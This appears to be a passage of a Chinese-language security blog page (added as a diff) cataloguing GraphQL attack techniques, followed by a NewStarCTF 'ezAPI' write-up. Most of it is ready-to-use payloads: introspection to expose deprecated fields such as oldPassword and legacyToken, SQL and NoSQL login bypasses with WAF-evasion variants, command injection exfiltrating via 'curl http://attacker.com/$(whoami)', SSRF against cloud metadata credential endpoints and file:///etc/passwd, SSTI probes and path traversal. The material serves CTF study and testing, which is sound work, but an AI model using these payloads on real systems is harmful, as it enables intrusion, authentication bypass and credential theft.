+<h4 id="废弃字段专项"><a href="#废弃字段专项" class="headerlink" title="废弃字段专项"></a>废弃字段专项</h4><blockquote>
+<p>规则：内省显示 <code>isDeprecated: true</code></p>
+</blockquote>
+<p><strong>原理</strong>：<code>@deprecated</code> 只影响文档与 IDE 提示，<strong>不影响可查询性</strong>。废弃字段通常是第一版接口，鉴权和校验都停留在早期实现，后续加了权限体系却没回头补——是整个 schema 里权限覆盖率最低的区域。</p>
+<h5 id="枚举废弃字段-payload"><a href="#枚举废弃字段-payload" class="headerlink" title="枚举废弃字段 payload"></a><strong>枚举废弃字段 payload</strong></h5><pre><code class="javascript">query &#123;
+  __type(name: &quot;User&quot;) &#123;
+    fields(includeDeprecated: true) &#123;
+      name
+      isDeprecated
+      deprecationReason
+      type &#123; name &#125;
+    &#125;
+  &#125;
+&#125;
+</code></pre>
+<p>默认内省查询不会返回废弃字段，必须带上 <code>includeDeprecated: true</code>。</p>
+<h5 id="利用示例"><a href="#利用示例" class="headerlink" title="利用示例"></a><strong>利用示例</strong></h5><p>枚举拿到废弃字段名后直接请求：</p>
+<pre><code class="javascript">query &#123;
+  user(id: 1) &#123;
+    oldPassword
+    legacyToken
+    internalFlag
+  &#125;
+&#125;
+</code></pre>
+<h5 id="拓展测试思路"><a href="#拓展测试思路" class="headerlink" title="拓展测试思路"></a>拓展测试思路</h5><ul>
+<li>废弃字段 + IDOR：<code>user(id:任意id) &#123; oldPassword &#125;</code></li>
+<li>废弃字段 + 横向穿透：在嵌套关联对象里找废弃敏感字段</li>
+</ul>
+<pre><code class="javascript">query &#123;
+  publicPost(id:1) &#123;
+    author &#123;
+      oldPassword
+      legacyToken
+    &#125;
+  &#125;
+&#125;
+</code></pre>
+<ul>
+<li>废弃 Mutation：同样可以用内省枚举废弃 mutation，往往存在提权、写入越权</li>
+</ul>
+<pre><code class="javascript">query &#123;
+  __schema &#123;
+    mutationType &#123;
+      fields(includeDeprecated:true) &#123;
+        name
+        isDeprecated
+      &#125;
+    &#125;
+  &#125;
+&#125;
+</code></pre>
+<h4 id="适用条件-1"><a href="#适用条件-1" class="headerlink" title="适用条件"></a>适用条件</h4><ol>
+<li>生产环境开启内省，或可通过盲猜 &#x2F; 爆破重建 Schema</li>
+<li>鉴权放在网关、顶层根 resolver，<strong>嵌套对象不做二次鉴权</strong></li>
+<li><code>Schema </code>存在关联字段：<code>author</code> &#x2F; <code>owner</code> &#x2F; <code>parent</code> &#x2F; <code>postedBy</code>，形成越权链路</li>
+<li><code>Schema </code>定义了敏感字段，前端业务没有使用该字段</li>
+</ol>
+<h3 id="C-线：下游注入"><a href="#C-线：下游注入" class="headerlink" title="C 线：下游注入"></a>C 线：下游注入</h3><blockquote>
+<p>核心一句话：GraphQL 只做<strong>类型校验</strong>，不负责内容安全；注入不在 GraphQL 本身，在 resolver 下游的业务代码。 </p>
+<p>前置判断：参数类型为 <code>String</code> &#x2F; 自定义标量 &#x2F; <code>JSON</code> &#x2F; <code>InputObject</code>；<code>Int/Boolean</code> 基本很难利用。</p>
+</blockquote>
+<h4 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h4><p>触发条件：参数直接字符串拼接进 SQL，没有预编译</p>
+<h5 id="直接-payload"><a href="#直接-payload" class="headerlink" title="直接 payload"></a>直接 payload</h5><pre><code class="javascript">query &#123;
+  users(filter: &quot;1&#39; OR &#39;1&#39;=&#39;1&quot;) &#123;
+    id name password
+  &#125;
+&#125;
+</code></pre>
+<h5 id="变量形式（规避-waf-检测-query-文本）"><a href="#变量形式（规避-waf-检测-query-文本）" class="headerlink" title="变量形式（规避 waf 检测 query 文本）"></a>变量形式（规避 waf 检测 query 文本）</h5><pre><code class="json">query GetUsers($f: String) &#123;
+  users(filter: $f) &#123; id name &#125;
+&#125;
+</code></pre>
+<pre><code class="java">&#123;
+  &quot;query&quot;: &quot;query GetUsers($f: String) &#123; users(filter: $f) &#123; id name &#125; &#125;&quot;,
+  &quot;variables&quot;: &#123;
+    &quot;f&quot;: &quot;&#39; OR &#39;1&#39;=&#39;1&#39; -- &quot;
+  &#125;
+&#125;
+</code></pre>
+<p>登录认证绕过</p>
+<pre><code class="javascript">query Login($u: String!, $p: String!) &#123;
+  login(username: $u, password: $p) &#123;
+    token user &#123; id role &#125;
+  &#125;
+&#125;
+</code></pre>
+<pre><code class="json">&#123;
+  &quot;variables&quot;: &#123;
+    &quot;u&quot;: &quot;admin&#39; -- &quot;,
+    &quot;p&quot;: &quot;anything&quot;
+  &#125;
+&#125;
+</code></pre>
+<h5 id="HITCTF2018-BabyQuery（Base32-包装-SQLi-样例）"><a href="#HITCTF2018-BabyQuery（Base32-包装-SQLi-样例）" class="headerlink" title="HITCTF2018 BabyQuery（Base32 包装 SQLi 样例）"></a>HITCTF2018 BabyQuery（Base32 包装 SQLi 样例）</h5><p>重点：编码只是传输壳，解码后原样拼接 SQL，<strong>编码≠防护</strong> </p>
+<p>目标字段：<code>getscorebyyourname(name)</code> </p>
+<p>payload 模板</p>
+<pre><code class="javascript">query &#123;
+  getscorebyyourname(name: &quot;&lt;B32&gt;&quot;) &#123;
+    score name
+  &#125;
+&#125;
+</code></pre>
+<p>Python 编码脚本</p>
+<pre><code class="py">import base64
+import sys
+sql = sys.argv[1]
+print(base64.b32encode(sql.encode()).decode())
+</code></pre>
+<pre><code>python b32.py &quot;1&#39; union select sqlite_version()-- &quot;
+</code></pre>
+<h4 id="NoSQL-注入"><a href="#NoSQL-注入" class="headerlink" title="NoSQL 注入"></a>NoSQL 注入</h4><p>触发条件：参数直接传入 Mongo 查询对象，类型是 <code>JSON/InputObject</code> </p>
+<h5 id="布尔绕过登录"><a href="#布尔绕过登录" class="headerlink" title="布尔绕过登录"></a>布尔绕过登录</h5><pre><code class="javascript">query Login($u: JSON, $p: JSON) &#123;
+  login(username: $u, password: $p) &#123;
+    token user &#123; id role &#125;
+  &#125;
+&#125;
+</code></pre>
+<pre><code class="json">&#123;
+  &quot;variables&quot;: &#123;
+    &quot;u&quot;: &#123;&quot;$ne&quot;: null&#125;,
+    &quot;p&quot;: &#123;&quot;$ne&quot;: null&#125;
+  &#125;
+&#125;
+</code></pre>
+<h5 id="正则盲注"><a href="#正则盲注" class="headerlink" title="正则盲注"></a>正则盲注</h5><pre><code class="json">&#123;
+  &quot;variables&quot;: &#123;
+    &quot;u&quot;: &#123;&quot;$regex&quot;: &quot;^admin&quot;&#125;,
+    &quot;p&quot;: &#123;&quot;$ne&quot;: null&#125;
+  &#125;
+&#125;
+</code></pre>
+<h5 id="类型不匹配的绕法"><a href="#类型不匹配的绕法" class="headerlink" title="类型不匹配的绕法"></a><strong>类型不匹配的绕法</strong></h5><p><strong>若 <code>users</code> 直接收对象</strong></p>
+<pre><code class="javascript">query &#123;
+  users(filter: &#123; username: &#123; $ne: null &#125; &#125;) &#123;
+    id username password
+  &#125;
+&#125;
+</code></pre>
+<h4 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h4><p>触发条件：resolver 调用<code>exec/subprocess/system</code>，拼接<code>host/ip/</code>文件名等参数 </p>
+<h5 id="基础回显"><a href="#基础回显" class="headerlink" title="基础回显"></a>基础回显</h5><pre><code class="javascript">mutation &#123;
+  pingHost(host: &quot;127.0.0.1; id&quot;) &#123;
+    output status
+  &#125;
+&#125;
+</code></pre>
+<h5 id="无回显外带"><a href="#无回显外带" class="headerlink" title="无回显外带"></a>无回显外带</h5><pre><code class="javascript">mutation &#123;
+  pingHost(host: &quot;127.0.0.1; curl http://attacker.com/$(whoami)&quot;) &#123;
+    status
+  &#125;
+&#125;
+</code></pre>
+<h5 id="文件处理场景"><a href="#文件处理场景" class="headerlink" title="文件处理场景"></a><strong>文件处理场景</strong></h5><pre><code class="javascript">mutation &#123;
+  convertImage(url: &quot;x.jpg; curl http://attacker.com/`id`&quot;) &#123;
+    status
+  &#125;
+&#125;
+</code></pre>
+<h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><p>触发条件：服务端发起 HTTP 请求，无 IP &#x2F; 协议白名单 </p>
+<h5 id="云元数据"><a href="#云元数据" class="headerlink" title="云元数据"></a>云元数据</h5><pre><code class="javascript">mutation &#123;
+  importFromUrl(url: &quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/&quot;) &#123;
+    content
+  &#125;
+&#125;
+</code></pre>
+<h5 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h5><pre><code class="javascript">query &#123;
+  fetchPreview(url: &quot;http://127.0.0.1:6379&quot;) &#123;
+    body status
+  &#125;
+&#125;
+</code></pre>
+<h5 id="协议绕过（file-gopher-dict-）"><a href="#协议绕过（file-gopher-dict-）" class="headerlink" title="协议绕过（file:// &#x2F; gopher:// &#x2F; dict://）"></a><strong>协议绕过（<code>file://</code> &#x2F; <code>gopher://</code> &#x2F; <code>dict://</code>）</strong></h5><pre><code class="javascript">query &#123;
+  fetchPreview(url: &quot;file:///etc/passwd&quot;) &#123;
+    body
+  &#125;
+&#125;
+</code></pre>
+<h4 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h4><p>触发条件：输入直接交给模板引擎渲染，而非作为变量传入 </p>
+<h5 id="探测-payload"><a href="#探测-payload" class="headerlink" title="探测 payload"></a>探测 payload</h5><pre><code class="javascript">mutation &#123;
+  sendNotification(template: &quot;&#123;&#123;7*7&#125;&#125;&quot;) &#123;
+    ok
+  &#125;
+&#125;
+</code></pre>
+<p>引擎标记速查</p>
+<ul>
+<li>Jinja2&#x2F;Twig：<code>&#123;&#123;7*7&#125;&#125;</code></li>
+<li>FreeMarker &#x2F; EL：<code>$&#123;7*7&#125;</code></li>
+<li>Ruby ERB：<code>#&#123;7*7&#125;</code></li>
+<li>EJS&#x2F;ERB：<code>&lt;%= 7*7 %&gt;</code></li>
+</ul>
+<h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><p>触发条件：路径直接拼接，无路径归一化、无白名单</p>
+<pre><code class="javascript">query &#123;
+  readFile(path: &quot;../../../../etc/passwd&quot;) &#123;
+    content
+  &#125;
+&#125;
+</code></pre>
+<pre><code class="javascript">query &#123;
+  getTemplate(name: &quot;../../../../app/config/database.yml&quot;) &#123;
+    content
+  &#125;
+&#125;
+</code></pre>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="NewStarCTF-公开赛赛道-ezAPI"><a href="#NewStarCTF-公开赛赛道-ezAPI" class="headerlink" title="[NewStarCTF 公开赛赛道]ezAPI"></a><strong>[NewStarCTF 公开赛赛道]ezAPI</strong></h2><p>这道题考的知识点我之前没学过，先了解一下GraphQL再做题</p>
+<p>这个页面只能输入数字，没有头绪</p>
+<p><img src="/./GraphQL.assets/image-20260808171747827.png" alt="image-20260808171747827"></p>
+<p>访问<code>www.zip</code>得到源码</p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+$id = $_POST[&#39;id&#39;];
+function waf($str)&#123;
+    if(!is_numeric($str) || preg_replace(&quot;/[0-9]/&quot;,&quot;&quot;,$str) !== &quot;&quot;)&#123;
+        return False;
+    &#125;else&#123;
+        return True;
+    &#125;
+&#125;
+
+function send($data)
+&#123;
+    $options = array(
+        &#39;http&#39; =&gt; array(
+            &#39;method&#39; =&gt; &#39;POST&#39;,
+            &#39;header&#39; =&gt; &#39;Content-type: application/json&#39;,
+            &#39;content&#39; =&gt; $data,
+            &#39;timeout&#39; =&gt; 10 * 60
+        )
+    );
+    $context = stream_context_create($options);
+    $result = file_get_contents(&quot;http://graphql:8080/v1/graphql&quot;, false, $context);
+    return $result;
+&#125;
+
+if(isset($id))&#123;
+    if(waf($id))&#123;
+        isset($_POST[&#39;data&#39;]) ? $data=$_POST[&#39;data&#39;] : $data=&#39;&#123;&quot;query&quot;:&quot;query&#123;\nusers_user_by_pk(id:&#39;.$id.&#39;) &#123;\nname\n&#125;\n&#125;\n&quot;, &quot;variables&quot;:null&#125;&#39;;
+        $res = json_decode(send($data));
+        if($res-&gt;data-&gt;users_user_by_pk-&gt;name !== NULL)&#123;
+            echo &quot;ID: &quot;.$id.&quot;&lt;br&gt;Name: &quot;.$res-&gt;data-&gt;users_user_by_pk-&gt;name;
+        &#125;else&#123;
+            echo &quot;&lt;b&gt;Can&#39;t found it!&lt;/b&gt;&lt;br&gt;DEBUG: &quot;;
+            var_dump($res-&gt;data);
+        &#125;
+    &#125;else&#123;
+        die(&quot;&lt;b&gt;Hacker!&lt;/b&gt;&quot;);
+    &#125;
+&#125;else&#123;
+    die(&quot;&lt;b&gt;No Data?&lt;/b&gt;&quot;);
+&#125;
+?&gt;
+</code></pre>
+<p>看到其通过garphql来查询数据 </p>
+<pre><code>    $context = stream_context_create($options);
+    $result = file_get_contents(&quot;http://graphql:8080/v1/graphql&quot;, false, $context);
+    return $result;
+</code></pre>
+<p><strong>GraphQL 内省查询枚举出来数据库全部表名</strong></p>
+<pre><code>id=1&amp;data=&#123;&quot;query&quot;:&quot;&#123;__schema&#123;types&#123;name&#125;&#125;&#125;&quot;&#125;
+</code></pre>
+<p><img src="/./GraphQL.assets/image-20260808171633061.png" alt="image-20260808171633061"></p>
+<p>查询flag 表</p>
+<pre><code>id=1&amp;data=&#123;&quot;query&quot;:&quot;&#123;ffffllllaaagggg_1n_h3r3_flag&#123;flag&#125;&#125;&quot;&#125;
+</code></pre>
+<p><img src="/./GraphQL.assets/image-20260808171351460.png" alt="image-20260808171351460"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2026 - 2026 QisPath
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;QisPath
+        </div>
+        <div>
+            基于 <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> 与
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
